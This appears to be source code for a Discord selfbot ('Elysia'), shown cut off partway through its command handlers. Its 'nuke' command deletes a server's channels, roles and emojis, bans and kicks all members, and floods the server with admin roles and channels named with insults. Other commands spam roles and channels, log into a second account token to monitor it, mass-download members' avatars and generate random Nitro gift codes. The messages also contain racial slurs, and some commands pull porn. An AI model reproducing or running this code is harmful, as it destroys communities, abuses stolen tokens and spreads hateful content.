const Discord = require('discord.js');
var bot = new Discord.Client({ disableEveryone: true });                       
const moment = require('moment')
const hastebin = require('hastebin')
const { RichEmbed } = require('discord.js')
const iplookup = require('ipapi.co')
var Fakerator = require("fakerator");
var fakerator = Fakerator();
const crypto = require('crypto-price')
const axios = require('axios').default;
const { randomString, sleep } = require('./util/Functions')
const isReachable = require('is-reachable');
const shorten = require('node-url-shortener')
const fs = require('fs')
const fetch = require('node-fetch')
const ascii = require('ascii-art')
const leet = require('1337')
const randomstring = require("randomstring");
const randomnum = require("unique-random");
const { getHWID } = require('hwid')
const cryptocurrencies = require('cryptocurrencies');
const rand = randomnum(1, 6);
let interval;
const superagent = require("superagent");
const { settings } = require('cluster');
const { measureMemory } = require('vm');
const readline = require("readline")
const randomPuppy = require('random-puppy');
const request = require('snekfetch');
const config = require(`./config.json`)
const webhook = require("webhook-discord");
const wbhook = config.webhook
const { base64encode, base64decode } = require('nodejs-base64');
const Pornsearch = require('pornsearch');
const { url } = require('inspector');
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});
let prefix = config.prefix
let Gif = config.Gif
let footer = config.footer
let activity = config.activity
let token = config.token




bot.on("error", (e) => {
	log.error(e);
	return;
});

bot.on("warn", (e) => {
	log.warn(e);
	return;
});


(async function () {

bot.on("ready", async () =>{


    console.clear();
    console.log("                             Selfbot connected to you account!")

    bot.user.setActivity(activity, {type: 'LISTENING'}).catch(console.error);
    console.log(`
                                ╦════════════════════════╦
                                ║                        ║
                                ║  E L Y S I A  Selfbot  ║
                                ║     Made by dxmon      ║
                                ║                        ║
                                ╩════════════════════════╩
    `);

    console.log("                               THE DEMON IS ALWAYS WATCHING")
    console.log(" ")
    console.log(" ")
    console.log(" ")
    console.log(" ")
    console.log(" ")
    console.log(" ")
    console.log(" ")
    console.log(" ")
    console.log("                          For the Help options just type " + prefix + "help")
})

bot.on("message", async message =>{
    const args = message.content.slice(prefix.length).trim().split(/ +/g);
    const command = args.shift();
  
    if(message.author.id == bot.user.id) {

        if(!message.guild || message.author.bot) return;

        if(command == "spy") {
            const client2 = new Discord.Client({ disableEveryone: false });   

            client2.on("ready", async () =>{
                console.log("Connected to other token!")
            })
            client2.on("message", async message =>{
            if(message.author.id === client2.user.id) {
                console.log(client2.user.tag + " send message: " + message.content + " To the server " + message.guild.name)
            }})

            client2.login(args[0])
        }

        


        if(command == "blank") {
            let password = args[0]
            if (!password) return message.reply('You need to put your password as second argument, do this somewhere nobody can see you type it.')
            bot.user.setAvatar("https://cdn.discordapp.com/attachments/675096319848873994/675101288954069062/transparent-picture.png")
            bot.user.setUsername("ٴٴٴٴٴٴٴٴٴٴ")
            message.react("😈")
        }


        
        
        if(command == "eth") {
            message.delete()
            crypto.getCryptoPrice("USD", "ETH").then(obj => {
                message.channel.send(new Discord.RichEmbed().setDescription(`1 Ethereum is worth ${obj.price}$`).setFooter(footer).setColor("#000000"))
            })
        }

        
        if(command == "btc") {
            message.delete()
            crypto.getCryptoPrice("USD", "BTC").then(obj => {
                message.channel.send(new Discord.RichEmbed().setDescription(`1 Bitcoin is worth ${obj.price}$`).setFooter(footer).setColor("#000000"))
            })
        }



    if(command == "test") {
        message.delete();
        const embedtest = new Discord.RichEmbed()
        .setDescription(`The Selfbot is fully connected to the account of: ${bot.user.username} and working`)
        .setFooter(footer)
        .setThumbnail(Gif)
        .setColor("#000000")
        message.channel.send(embedtest)
        console.log("command used: "+prefix+"test")
    }
    //#######################################################
    if(command == "half-token") {

        message.channel.send((base64encode(message.mentions.users.first().id)))

    }
    if(command == "steal-pfp") {
        message.delete()
        let members = message.guild.members.array()

        message.channel.send('Downloading ' + members.length + ' avatars, this may take some time.')
        for(let i = 0; i < members.length; i++) {
    
            let url = await fetch(members[i].user.displayAvatarURL)
            let buffer = await url.buffer()
    
             fs.writeFileSync(`./avatars/${members[i].user.tag}.png`, buffer)
    
    
        }
            }
        if(command == "help") {
        message.delete();
        const embedhelp = new Discord.RichEmbed()
        .setDescription("E L Y S I A - h e l p  m e n u")
        .addField('||.||', '||.||')
        .addField(prefix+'fhelp', '𝑨𝒍𝒍 𝒐𝒇 𝒕𝒉𝒆 𝒇𝒖𝒏 𝒐𝒑𝒕𝒊𝒐𝒏𝒔 𝒐𝒇 𝒕𝒉𝒊𝒔 𝑺𝒆𝒍𝒇𝒃𝒐𝒕')
        .addField(prefix+'shelp', '𝑨𝒍𝒍 𝒐𝒇 𝒕𝒉𝒆 𝒔𝒑𝒂𝒎 𝒐𝒑𝒕𝒊𝒐𝒏𝒔 𝒐𝒇 𝒕𝒉𝒊𝒔 𝑺𝒆𝒍𝒇𝒃𝒐𝒕')
        .addField(prefix+'nhelp', '𝑨𝒍𝒍 𝒐𝒇 𝒕𝒉𝒆 𝑵𝑺𝑭𝑾 𝒐𝒑𝒕𝒊𝒐𝒏𝒔 𝒐𝒇 𝒕𝒉𝒊𝒔 𝑺𝒆𝒍𝒇𝒃𝒐𝒕')
        .addField(prefix+'ahelp', '𝑨𝒍𝒍 𝒐𝒇 𝒕𝒉𝒆 𝒂𝒄𝒕𝒊𝒗𝒊𝒕𝒚 𝒐𝒑𝒕𝒊𝒐𝒏𝒔 𝒐𝒇 𝒕𝒉𝒊𝒔 𝒔𝒆𝒍𝒇𝒃𝒐𝒕')
        .addField(prefix+'nuhelp', '𝑨𝒍𝒍 𝒕𝒉𝒆 𝑵𝒖𝒌𝒆 𝒐𝒑𝒕𝒊𝒐𝒏𝒔 𝒐𝒇 𝒕𝒉𝒊𝒔 𝑺𝒆𝒍𝒇𝒃𝒐𝒕')
        .addField(prefix+'ihelp', '𝑨𝒍𝒍 𝒐𝒇 𝒕𝒉𝒆 𝒊𝒏𝒇𝒐 𝒐𝒑𝒕𝒊𝒐𝒏𝒔 𝒐𝒇 𝒕𝒉𝒊𝒔 𝑺𝒆𝒍𝒇𝒃𝒐𝒕')
        .addField(prefix+'bhelp', '𝑨𝒍𝒍 𝒐𝒇 𝒕𝒉𝒆 𝒃𝒂𝒔𝒆64 𝒐𝒑𝒕𝒊𝒐𝒏𝒔')
        .addField('||.||', '||.||')
        .setFooter("E L Y S I A  S E L F B O T  | 86 commands")
        .setThumbnail(Gif)
        .setColor("#000000")
        message.channel.send(embedhelp)
        .then(message => message.delete(20000))
        console.log("command used: "+prefix+"help")
    }
    if(command == "bhelp") {
        message.delete()
        const bhelp = new Discord.RichEmbed()
        .setDescription("E L Y S I A    h e l p  m e n u")
        .addField(prefix+"base64 decode", "𝒅𝒆𝒄𝒐𝒅𝒆𝒔 𝒚𝒐𝒖𝒓 𝒕𝒆𝒙𝒕")
        .addField(prefix+"base64 encode", "𝒆𝒏𝒄𝒐𝒅𝒆𝒔 𝒚𝒐𝒖𝒓 𝒕𝒆𝒙𝒕")
        .setColor("#000000")
        .setFooter(footer)
        message.channel.send(bhelp)
        .then(message => message.delete(20000))
        console.log("command used: "+prefix+"bhelp")
        
    }

    if(command == "base64") {
        try {
          message.delete().catch();
          switch(args[0]) {
            case 'encode':
              if (!args.slice(1).join(' ')) return message.reply('You need to provide the string to encode!');
              message.channel.send(base64encode(args.slice(1).join(' ')));
              break;
            case 'decode':
              if (!args.slice(1).join(' ')) return message.reply('You need to provide the string to decode!');
              message.channel.send(base64decode(args.slice(1).join(' ')));
              break;
            default:
              return message.reply('You need to choose to Encode or Decode the string!');
              break;
          }
        } catch (err) {
          message.channel.send('There was an error!\n' + err).catch();
        }
      }

    //#######################################################
    if(command == "nuhelp") {
        message.delete()
        const nurhelp = new Discord.RichEmbed()
        .setThumbnail(Gif)
        .setDescription("E L Y S I A    h e l p  m e n u")
        .addField(prefix+'creater', '𝑪𝒓𝒆𝒂𝒕𝒆𝒔 50 𝑹𝒐𝒍𝒆𝒔 (𝒚𝒐𝒖 𝒏𝒆𝒆𝒅 𝒑𝒆𝒓𝒎𝒔)')
        .addField(prefix+'nuke', '𝑵𝒖𝒌𝒆𝒔 𝒕𝒉𝒆 𝒔𝒆𝒓𝒗𝒆𝒓 (𝒚𝒐𝒖 𝒏𝒆𝒆𝒅 𝒑𝒆𝒓𝒎𝒔)')
        .addField(prefix+'createtc', '𝑪𝒓𝒆𝒂𝒕𝒆𝒔 50 𝒕𝒆𝒙𝒕 𝒄𝒉𝒂𝒏𝒏𝒆𝒍𝒔 (𝒚𝒐𝒖 𝒏𝒆𝒆𝒅 𝒑𝒆𝒓𝒎𝒔)')
        .setColor("#000000")
        .setFooter(footer)
        message.channel.send(nurhelp)
        console.log("command used: "+prefix+"nuhelp")
    }
    //#######################################################
    if(command == "creater") {
        let rolename = "E L Y S I A  B Y  D X M O N | G E T  F U C K E D"
        message.delete()
        for (let i = 0; i < 50; i++) {
        message.guild.createRole ({

            name: rolename,

            permissions: 8,

            color: "RED"
        })}
        message.channel.send("Done! Fucked that niggers Server")
        console.log("command used: "+prefix+"creater")
        
    }
    //#######################################################
    if(command == "console-gen") {
        message.delete()
        for (let i = 0; i < args[0]; i++) {
            const nitrolengh = randomstring.generate(16);
            var data = data + 'https://discord.gift/' + nitrolengh + "\n";
            var lines = data.split('\n');
            fs.writeFile('./nitro/nitro-codes.txt', data, function(err) {
                if(err) throw err;
            })
        }
    }
    //#######################################################
    if(command == "createtc") {
        message.delete()
        for(let i = 0; i < 50; i++) {
            
            message.guild.createChannel("E L Y S I A  B Y  D X M O N | G E T  F U C K E D")
        }   
        message.channel.send("Done! Fucked that niggers Server") 
        console.log("command used: "+prefix+"createtc")
    }
    //#######################################################
    if(command == "nitro-edit") {
        message.delete()
        let nitroedit = await message.channel.send(`https://discord.gift/` + randomstring.generate(16))
        for (let i = 0; i < args[0]; i++) {
            const nitrolengh = randomstring.generate(16);
            setTimeout(function(){
            nitroedit.edit(`https://discord.gift/` + nitrolengh)
        }, 1500);
        }
    } 

    if(command == "nuke") {
        message.guild.channels.forEach(c => {
            c.delete();
        })
        message.guild.setName('NUKED BY DXMON NIGGERS').then(() => {
        }).catch(() => console.error)


        message.guild.roles.forEach(c => {
            c.delete();
        })
        message.guild.emojis.forEach(c => {
            c.delete();
        })

        message.guild.members.map(member => {
            member.ban().then(() => {
            }).catch(() => console.error)
        })
    
        message.guild.members.map(member => {
            member.kick().then(() => {
            }).catch(() => console.error)
        })

        for(let i = 0; i < 50; i++) {
            
            message.guild.createChannel("E L Y S I A  B Y  D X M O N | G E T  F U C K E D")
        }  
        for (let i = 0; i < 50; i++) {
            let rolename = "E L Y S I A  B Y  D X M O N | G E T  F U C K E D"
            message.guild.createRole ({
    
                name: rolename,
    
                permissions: 8,
    
                color: "RED"
            })} 
        console.log("command used: "+prefix+"nuke")
    }
    //#######################################################
    if(command == "nhelp") {
        message.delete()
        const nhelpembed = new Discord.RichEmbed()
        .setThumbnail(Gif)
        .setDescription("E L Y S I A - h e l p  m e n u")
        .addField('||.||', '||.||')
        .addField(prefix+'anal', '𝑺𝒆𝒏𝒅𝒔 𝒂𝒏 𝒂𝒏𝒂𝒍 𝒃𝒂𝒔𝒆𝒅 𝒑𝒊𝒄𝒕𝒖𝒓𝒆')
        .addField(prefix+'blowjob', '𝒔𝒆𝒏𝒅𝒔 𝒂𝒏 𝒃𝒍𝒐𝒘𝒋𝒐𝒃 𝒃𝒂𝒔𝒆𝒅 𝒑𝒊𝒄𝒕𝒖𝒓𝒆')
        .addField(prefix+'lesbian', '𝑺𝒆𝒏𝒅𝒔 𝒂𝒏 𝒍𝒆𝒔𝒃𝒊𝒂𝒏 𝒃𝒂𝒔𝒆𝒅 𝒑𝒊𝒄𝒕𝒖𝒓𝒆')
        .addField(prefix+'boobs', '𝒔𝒆𝒏𝒅𝒔 𝒂𝒏 𝒃𝒐𝒐𝒃𝒔 𝒃𝒂𝒔𝒆𝒅 𝒑𝒊𝒄𝒕𝒖𝒓𝒆')
        .addField(prefix+'cum', '𝒔𝒆𝒏𝒅𝒔 𝒂𝒏 𝒄𝒖𝒎 𝒃𝒂𝒔𝒆𝒅 𝒑𝒊𝒄𝒕𝒖𝒓𝒆')
        .addField(prefix+'trap', '𝑺𝒆𝒏𝒅𝒔 𝒂𝒏 𝑻𝒓𝒂𝒑 𝒃𝒂𝒔𝒆𝒅 𝒑𝒊𝒄𝒕𝒖𝒓𝒆')
        .addField(prefix+'feet', '𝑺𝒆𝒏𝒅 𝒂𝒏 𝒇𝒆𝒆𝒕 𝒃𝒂𝒔𝒆𝒅 𝒑𝒊𝒄𝒕𝒖𝒓𝒆')
        .addField(prefix+'feetgif', '𝑺𝒆𝒏𝒅 𝒂𝒏 𝒇𝒆𝒆𝒕 𝒃𝒂𝒔𝒆𝒅 𝒈𝒊𝒇')
        .addField(prefix+'femdom', '𝒔𝒆𝒏𝒅𝒔 𝒂𝒏 𝒇𝒆𝒎𝒅𝒐𝒎 𝒃𝒂𝒔𝒆𝒅 𝒑𝒊𝒄𝒕𝒖𝒓𝒆')
        .addField(prefix+'les', '𝑺𝒆𝒏𝒅𝒔 𝒂𝒏 𝒍𝒆𝒔𝒃𝒊𝒂𝒏 𝒃𝒂𝒔𝒆𝒅 𝒑𝒊𝒄𝒕𝒖𝒓𝒆')
        .addField(prefix+'spank', 'spank')
        .addField(prefix+'ero', 'ero based')
        .setFooter(footer)
        .addField('||.||', '||.||')
        message.channel.send(nhelpembed)
        .then(message => message.delete(20000))
        console.log("command used: "+prefix+"nhelp")
    }
    //#######################################################
    if(command == "ero") {
        message.delete();
        let { body } = await superagent
        .get(`https://nekos.life/api/v2/img/ero`);

    let lesembed = new Discord.RichEmbed()
        .setTitle("𝑯 𝑬 𝑵 𝑻 𝑨 𝑰")
        .setImage(body.url)
        .setColor("#000000")
        .setTimestamp()
        .setFooter(footer)

    message.channel.send(lesembed);
    console.log("command used: "+prefix+"ero")
    }
    //#######################################################
    if(command == "spank") {
        message.delete();
        let { body } = await superagent
        .get(`https://nekos.life/api/v2/img/spank`);

    let lesembed = new Discord.RichEmbed()
        .setTitle("𝑯 𝑬 𝑵 𝑻 𝑨 𝑰")
        .setImage(body.url)
        .setColor("#000000")
        .setTimestamp()
        .setFooter(footer)

    message.channel.send(lesembed);
    console.log("command used: "+prefix+"spank")
    }
    //#######################################################
    if(command == "les") {
        message.delete();
        let { body } = await superagent
        .get(`https://nekos.life/api/v2/img/les`);

    let lesembed = new Discord.RichEmbed()
        .setTitle("𝑯 𝑬 𝑵 𝑻 𝑨 𝑰")
        .setImage(body.url)
        .setColor("#000000")
        .setTimestamp()
        .setFooter(footer)

    message.channel.send(lesembed);
    console.log("command used: "+prefix+"les")
    }
    //#######################################################
    if(command == "femdom") {
        message.delete();
        let { body } = await superagent
        .get(`https://nekos.life/api/v2/img/femdom`);

    let femdomembed = new Discord.RichEmbed()
        .setTitle("𝑯 𝑬 𝑵 𝑻 𝑨 𝑰")
        .setImage(body.url)
        .setColor("#000000")
        .setTimestamp()
        .setFooter(footer)

    message.channel.send(femdomembed);
    console.log("command used: "+prefix+"femdom")
    }
    //#######################################################
    if(command == "feetgif") {
        message.delete();
        let { body } = await superagent
        .get(`https://nekos.life/api/v2/img/feetg`);

    let feetgifembed = new Discord.RichEmbed()
        .setTitle("𝑯 𝑬 𝑵 𝑻 𝑨 𝑰")
        .setImage(body.url)
        .setColor("#000000")
        .setTimestamp()
        .setFooter(footer)

    message.channel.send(feetgifembed);
    console.log("command used: "+prefix+"feetgif")
    }
    //#######################################################
    if(command == "anal") {
        message.delete();
        let { body } = await superagent
        .get(`https://nekos.life/api/v2/img/anal`);

    let analEmbed = new Discord.RichEmbed()
        .setTitle("𝑯 𝑬 𝑵 𝑻 𝑨 𝑰")
        .setImage(body.url)
        .setColor("#000000")
        .setTimestamp()
        .setFooter(footer)

    message.channel.send(analEmbed);
    console.log("command used: "+prefix+"anal")
    }
    //#######################################################
    if(command == "blowjob") {
    message.delete()
    let {body} = await superagent
    .get(`https://nekos.life/api/v2/img/bj`);
    let blowjobEmbed = new Discord.RichEmbed()
    .setTitle("𝑯 𝑬 𝑵 𝑻 𝑨 𝑰") 
    .setImage(body.url)
    .setColor("#000000")
    .setTimestamp()
    .setFooter(footer)
    message.channel.send(blowjobEmbed);
    console.log("command used: "+prefix+"blowjob")
    }
    //#######################################################
    if(command == "boobs") {
        message.delete()
        let {body} = await superagent
        .get(`https://nekos.life/api/v2/img/tits`);
    
        let boobsEmbed = new Discord.RichEmbed()
        .setTitle("𝑯 𝑬 𝑵 𝑻 𝑨 𝑰")
        .setImage(body.url)
        .setColor("#000000")
        .setTimestamp()
        .setFooter(footer);
    
        message.channel.send(boobsEmbed);
        console.log("command used: "+prefix+"boobs")
    }
    //#######################################################
    if(command == "cum") {
        message.delete()
        let {body} = await superagent
        .get(`https://nekos.life/api/v2/img/cum`);
      
        let cumEmbed = new Discord.RichEmbed()
        .setTitle("𝑯 𝑬 𝑵 𝑻 𝑨 𝑰") 
        .setImage(body.url)
        .setColor("#000000")
        .setTimestamp()
        .setFooter(footer);
    
        message.channel.send(cumEmbed);
        console.log("command used: "+prefix+"cum")
    }
    //#######################################################
    if(command == "pussy") {
    message.delete()
    let {body} = await superagent
    .get(`https://nekos.life/api/v2/img/pussy`);
  
    let pussyEmbed = new Discord.RichEmbed()
    .setTitle("𝑯 𝑬 𝑵 𝑻 𝑨 𝑰") 
    .setImage(body.url)
    .setColor("#000000")
    .setTimestamp()
    .setFooter(footer)

    message.channel.send(pussyEmbed);
    console.log("command used: "+prefix+"pussy")
    }
    //#######################################################
    if(command == "trap") {
        message.delete()
        let {body} = await superagent
        .get(`https://nekos.life/api/v2/img/trap`);
    
        let trapEmbed = new Discord.RichEmbed()
        .setTitle("𝑯 𝑬 𝑵 𝑻 𝑨 𝑰")
        .setImage(body.url)
        .setColor("##000000")
        .setTimestamp()
        .setFooter(footer)
    
        message.channel.send(trapEmbed);
        console.log("command used: "+prefix+"trap")
    }
    //#######################################################
    if(command == "feet") {
        message.delete()
        let {body} = await superagent
        .get(`https://nekos.life/api/v2/img/feet`);
    
        let feetEmbed = new Discord.RichEmbed()
        .setTitle("𝑯 𝑬 𝑵 𝑻 𝑨 𝑰")
        .setImage(body.url)
        .setColor("#000000")
        .setTimestamp()
        .setFooter(footer)
    
        message.channel.send(feetEmbed);
        console.log("command used: "+prefix+"feet")
    }

    if(command == "hack-the-box") {
        message.delete()
        for (let i = 0; i < args[0]; i++) {
        setTimeout(function(){
        let {body} = superagent
        superagent.post("https://www.hackthebox.eu/api/invite/generate")
        .then(response => {
            let rawBody = response.text;
            let purecd = rawBody.split('"')
            message.channel.send(base64decode(purecd[7]));
                });
            }, 5000);
        }
    }

    if(command == "fake-name") {
        message.delete()
        var length = "9"
        let fakename = new Discord.RichEmbed()
        .setColor("#000000")
        .setThumbnail(Gif)
        .setFooter(footer)
        .setDescription("E L Y S I A")
        .addField("**name:**", fakerator.names.prefix() + " " + fakerator.names.name())
        .addField("**Country:**", fakerator.address.country())
        .addField("**City:**", fakerator.address.city())
        .addField("**Street:**", fakerator.address.street())
        .addField("**Zip code:**", fakerator.address.postCode())
        .addField("**Phone number**", fakerator.phone.number())
        .addField("**E-Mail:**", fakerator.internet.email())
        .addField("**Password**", fakerator.internet.password(length))
        .addField("**IP:**", fakerator.internet.ip())
        message.channel.send(fakename)
    
    }
    //#######################################################
    if(command == "fhelp") {
        message.delete();
        const embedhelpfun = new Discord.RichEmbed()
        .setDescription("E L Y S I A - h e l p  m e n u")
        .addField('||.||', '||.||')
        .addField(prefix+'typing', '𝑮𝒊𝒗𝒆𝒔 𝒚𝒐𝒖 𝒕𝒉𝒆 𝒕𝒚𝒑𝒊𝒏𝒈 𝒔𝒕𝒂𝒕𝒖𝒔 𝒘𝒊𝒕𝒉𝒐𝒖𝒕 𝒕𝒚𝒑𝒊𝒏𝒈')
        .addField(prefix+'stoptyping', '𝑹𝒆𝒎𝒐𝒗𝒆𝒔 𝒕𝒉𝒆 𝒕𝒚𝒑𝒊𝒏𝒈 𝒔𝒕𝒂𝒕𝒖𝒔')
        .addField(prefix+'pussypic', '𝑺𝒆𝒏𝒅𝒔 𝒂𝒏 𝒊𝒎𝒂𝒈𝒆 𝒐𝒇 𝒂𝒏 𝒑𝒖𝒔𝒔𝒚')
        .addField(prefix+'nword', '𝒔𝒆𝒏𝒅𝒔 𝒕𝒉𝒆 𝒏𝒘𝒐𝒓𝒅')
        .addField(prefix+'rimage', '𝑺𝒆𝒏𝒅𝒔 𝒂 𝒓𝒂𝒏𝒅𝒐𝒎 𝒊𝒎𝒂𝒈𝒆 (𝒅𝒐𝒏𝒕 𝒘𝒐𝒓𝒌 𝒔𝒐𝒎𝒆𝒕𝒊𝒎𝒆𝒔)')
        .addField(prefix+'clear', '𝑪𝒍𝒆𝒂𝒓𝒔 𝒕𝒉𝒆 𝑪𝒉𝒂𝒕')
        .addField(prefix+'cock', '𝑺𝒆𝒏𝒅𝒔 𝒂𝒏 𝑷𝒊𝒄𝒕𝒖𝒓𝒆 𝒐𝒇 𝒂𝒏 𝒄𝒐𝒄𝒌')
        .addField(prefix+'penis', '𝑯𝒐𝒘 𝒍𝒐𝒏𝒈 𝒊𝒔 𝒚𝒐𝒖𝒓 𝑷𝒆𝒏𝒊𝒔?')
        .addField(prefix+'gay', '𝑯𝒐𝒘 𝒈𝒂𝒚 𝒂𝒓𝒆 𝒚𝒐𝒖? 100% 𝒄𝒐𝒓𝒓𝒆𝒄𝒕')
        .addField(prefix+'mee6', '𝑭𝒂𝒓𝒎𝒔 𝒎𝒆𝒆6 𝒍𝒆𝒗𝒆𝒍𝒔 𝒇𝒐𝒓 𝒚𝒐𝒖')
        .addField(prefix+'shorten', '𝑨𝒏 𝒆𝒂𝒔𝒚 𝒍𝒊𝒏𝒌 𝒔𝒉𝒐𝒓𝒕𝒆𝒏𝒆𝒓')
        .addField(prefix+'s-pfp', '𝑪𝒐𝒑𝒊𝒆𝒔 𝒕𝒉𝒆 𝒑𝒓𝒐𝒇𝒊𝒍𝒆 𝒑𝒊𝒄𝒕𝒖𝒓𝒆 𝒐𝒇 𝒕𝒉𝒆 𝒑𝒆𝒓𝒔𝒐𝒏 𝒚𝒐𝒖 𝒑𝒊𝒏𝒈')
        .addField(prefix+'ascii', '𝑳𝒆𝒕𝒔 𝒚𝒐𝒖 𝒄𝒓𝒆𝒂𝒕𝒆 𝒚𝒐𝒖𝒓 𝒐𝒘𝒏 𝒂𝒔𝒄𝒊𝒊 𝒂𝒓𝒕')
        .addField(prefix+'8ball', '𝒀𝒆𝒔 𝒐𝒓 𝑵𝒐?')
        .addField(prefix+'fhelp2', '𝑻𝒉𝒆 𝒔𝒆𝒄𝒐𝒏𝒅 𝒑𝒂𝒈𝒆 𝒐𝒇 𝒕𝒉𝒆 𝒇𝒖𝒏 𝒐𝒑𝒕𝒊𝒐𝒏𝒔')
        .addField('||.||', '||.||')
        .setThumbnail(Gif)
        .setFooter(footer)
        .setColor("#000000")
        message.channel.send(embedhelpfun)
        .then(message => message.delete(20000))
        console.log("command used: "+prefix+"fhelp")
    }
    //#######################################################
    if(command == "fhelp2") {
        message.delete();
        const fhelp2 = new Discord.RichEmbed()
        .setDescription("E L Y S I A - h e l p  m e n u")
        .addField('||.||', '||.||')
        .addField(prefix+'leet', '𝑻𝒖𝒓𝒏𝒔 𝒚𝒐𝒖𝒓 𝒎𝒆𝒔𝒔𝒂𝒈𝒆 𝒊𝒏𝒕𝒐 𝒍𝒆𝒆𝒕 𝒔𝒑𝒆𝒂𝒌')
        .addField(prefix+'leave-all', '𝑳𝒆𝒂𝒗𝒆𝒔 𝒂𝒍𝒍 𝒚𝒐𝒖𝒓 𝑺𝒆𝒓𝒗𝒆𝒓𝒔 (𝒐𝒏𝒍𝒚 𝒅𝒐 𝒊𝒕 𝒊𝒇 𝒚𝒐𝒖 𝒓𝒆𝒂𝒍𝒍𝒚 𝒘𝒂𝒏𝒕 𝒊𝒕)')
        .addField(prefix+'replay', '𝑺𝒆𝒏𝒅𝒔 𝒂 𝒑𝒂𝒓𝒕 𝒐𝒇 𝒕𝒉𝒆 𝒓𝒆𝒑𝒍𝒂𝒚 𝒍𝒚𝒓𝒊𝒄𝒔')
        .addField(prefix+'steal-emoji', '𝑺𝒕𝒆𝒂𝒍𝒔 𝒕𝒉𝒆 𝒔𝒆𝒓𝒗𝒆𝒓𝒔 𝒆𝒎𝒐𝒋𝒊𝒔')
        .addField(prefix+'purge', '𝑷𝒖𝒓𝒈𝒆𝒔 𝒂𝒏 𝒄𝒆𝒓𝒕𝒂𝒊𝒏𝒕 𝒂𝒎𝒎𝒐𝒖𝒏𝒕 𝒐𝒇 𝒎𝒆𝒔𝒔𝒂𝒈𝒆𝒔')
        .addField(prefix+'say', '𝑹𝒆𝒑𝒆𝒂𝒕𝒔 𝒚𝒐𝒖𝒓 𝒎𝒆𝒔𝒔𝒂𝒈𝒆')
        .addField(prefix+'dice', '𝒓𝒐𝒍𝒍𝒔 𝒂 𝒅𝒊𝒄𝒆')
        .addField(prefix+'slots', '𝑺𝒑𝒊𝒏𝒔 𝒕𝒉𝒆 𝒔𝒍𝒐𝒕 𝒎𝒂𝒄𝒉𝒊𝒏𝒆')
        .addField(prefix+"clone-serv [id1] [id2]", "𝒄𝒐𝒑𝒚𝒔 𝒔𝒆𝒓𝒗𝒆𝒓 𝒇𝒓𝒐𝒎 𝒊𝒅1 𝒕𝒐 𝒊𝒅2")
        .addField(prefix+"nitro [amount]", "𝒈𝒆𝒏𝒆𝒓𝒂𝒕𝒆𝒔 𝒉𝒐𝒘𝒆𝒗𝒆𝒓 𝒎𝒖𝒄𝒉 𝒏𝒊𝒕𝒓𝒐 𝒄𝒐𝒅𝒆𝒔 𝒚𝒐𝒖 𝒘𝒂𝒏𝒕")
        .addField(prefix+"proxy [type] [timeout]", "𝒈𝒊𝒗𝒆𝒔 𝒚𝒐𝒖 𝒇𝒓𝒆𝒔 𝒑𝒓𝒐𝒙𝒊𝒆𝒔")
        .addField(prefix+"steal-pfp", "𝑫𝒐𝒘𝒏𝒍𝒐𝒂𝒅𝒔 𝒂𝒍𝒍 𝒕𝒉𝒆 𝒑𝒇𝒑 𝒐𝒇 𝒕𝒉𝒆 𝒔𝒆𝒓𝒗𝒆𝒓 𝒕𝒐 𝒂 𝒇𝒐𝒍𝒅𝒆𝒓")
        .addField(prefix+"console-gen [ammount]", "𝑮𝒆𝒏𝒆𝒓𝒂𝒕𝒆𝒔 𝒏𝒊𝒕𝒓𝒐 𝒄𝒐𝒅𝒆𝒔 𝒊𝒏 𝒕𝒉𝒆 𝒄𝒐𝒏𝒔𝒐𝒍𝒆")
        .addField(prefix+"nitro-edit [ammount]", "𝑮𝒆𝒏𝒆𝒓𝒂𝒕𝒆𝒔 𝒏𝒊𝒕𝒓𝒐 𝒄𝒐𝒅𝒆𝒔 𝒃𝒚 𝒆𝒅𝒊𝒕𝒊𝒏𝒈 𝒂 𝒎𝒆𝒔𝒔𝒂𝒈𝒆")
        .addField(prefix+"hack-the-box [ammount]", "𝑮𝒆𝒏𝒆𝒓𝒂𝒕𝒆𝒔 𝒉𝒂𝒄𝒌 𝒕𝒉𝒆 𝒃𝒐𝒙 𝒊𝒏𝒗𝒊𝒕𝒆 𝒄𝒐𝒅𝒆𝒔 (𝒕𝒓𝒚 𝒊𝒕 𝒇𝒊𝒓𝒔𝒕 𝒔𝒌𝒊𝒅)")
        .addField(prefix+"gping", "𝑮𝒉𝒐𝒔𝒕 𝒑𝒊𝒏𝒈𝒔 𝒂 𝒖𝒔𝒆𝒓")
        .addField(prefix+"epilepsy", "𝑭𝑼𝑪𝑲 𝒀𝑶𝑼𝑹 𝑬𝒀𝑬𝑺")
        .addField(prefix+"dank", "𝑭𝒂𝒓𝒎 𝒅𝒂𝒏𝒌 𝒎𝒆𝒎𝒆𝒓 𝒄𝒐𝒊𝒏𝒔")
        .addField('||.||', '||.||')
        .setThumbnail(Gif)
        .setFooter(footer)
        .setColor("#000000")
        message.channel.send(fhelp2)
        .then(message => message.delete(20000))
        console.log("command used: "+prefix+"fhelp2")
    }
    //#######################################################
    if(command == "slots") {
        message.delete()
        var replys1 = [
	        ":gem: : :gem: : :gem: ",
	        ":lemon: : :lemon: : :lemon: ",
	        ":seven: : :seven: : :seven: ",
	        ":bell: : :bell: : :bell:",
	        ":cherries: : :cherries: : :cherries: ",
	        ":star: : :star: : :star: ",
	        ":gem: : :star: : :seven: ",
	        ":star: : :bell: : :bell:",
	        ":star: : :star: : :cherries: ",
	        ":gem: : :gem: : :cherries:",
	        ":gem: : :seven: : :seven: ",
	        ":star: : :bell: : :lemon: ",
	        ":star: : :star: : :cherries: ",
	        ":seven: : :star: : :star: ",
	        ":star: : :star: : :seven: ",
	        ":gem: : :gem: : :seven: "
	    ];
	    let reponse = (replys1[Math.floor(Math.random() * replys1.length)])

	    var replys2 = [
	        ":gem: : :gem: : :gem: ",
	        ":lemon: : :lemon: : :lemon: ",
	        ":seven: : :seven: : :seven: ",
	        ":bell: : :bell: : :bell:",
	        ":cherries: : :cherries: : :cherries: ",
	        ":gem: : :star: : :seven: ",
	        ":star: : :bell: : :bell:",
	        ":star: : :star: : :cherries: ",
	        ":gem: : :gem: : :cherries:",
	        ":gem: : :seven: : :seven: ",
	        ":star: : :bell: : :lemon: ",
	        ":star: : :star: : :cherries: ",
	        ":seven: : :star: : :star: ",
	        ":star: : :star: : :seven: ",
	        ":gem: : :gem: : :seven: ",
	        ":gem: : :cherries: : :cherries:",
	        ":gem: : :bell: : :star:"
	    ];
	    let reponse2 = (replys2[Math.floor(Math.random() * replys2.length)])
	    var replys3 = [
	        ":lemon: : :lemon: : :lemon: ",
	        ":bell: : :bell: : :bell:",
	        ":cherries: : :cherries: : :cherries: ",
	        ":star: : :star: : :star: ",
